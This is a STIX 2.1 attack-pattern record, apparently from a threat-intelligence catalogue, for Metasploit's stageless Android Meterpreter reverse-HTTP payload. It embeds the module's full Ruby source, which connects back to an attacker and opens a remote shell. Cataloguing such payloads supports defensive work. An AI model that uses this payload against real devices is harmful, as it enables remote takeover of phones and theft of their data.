{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--62759e10-0e93-4045-958d-2a3dbbb21f5e",
    "created": "2024-08-14T16:33:19.36124Z",
    "modified": "2024-08-14T16:33:19.361244Z",
    "name": "Android Meterpreter Shell, Reverse HTTP Inline",
    "description": "Connect back to attacker and spawn a Meterpreter shell 'License'     => MSF_LICENSE 'Platform'    => 'android' 'Arch'        => ARCH_DALVIK 'Handler'     => Msf::Handler::ReverseHttp 'Session'     => Msf::Sessions::Meterpreter_Java_Android 'Payload'     => '' )) end  # # Generate the transport-specific configuration # def transport_config(opts={}) transport_config_reverse_http(opts) end  def generate_jar(opts={}) opts[:stageless] = true super(opts) end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/android/meterpreter_reverse_http.rb",
            "external_id": "meterpreter_reverse_http.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::TransportConfig\n  include Msf::Payload::Single\n  include Msf::Payload::Android\n  include Msf::Payload::UUID::Options\n  include Msf::Sessions::MeterpreterOptions\n\n\n  def initialize(info = {})\n\n    super(merge_info(info,\n      'Name'        => 'Android Meterpreter Shell, Reverse HTTP Inline',\n      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'android',\n      'Arch'        => ARCH_DALVIK,\n      'Handler'     => Msf::Handler::ReverseHttp,\n      'Session'     => Msf::Sessions::Meterpreter_Java_Android,\n      'Payload'     => '',\n      ))\n  end\n\n  #\n  # Generate the transport-specific configuration\n  #\n  def transport_config(opts={})\n    transport_config_reverse_http(opts)\n  end\n\n  def generate_jar(opts={})\n    opts[:stageless] = true\n    super(opts)\n  end\nend\n"
}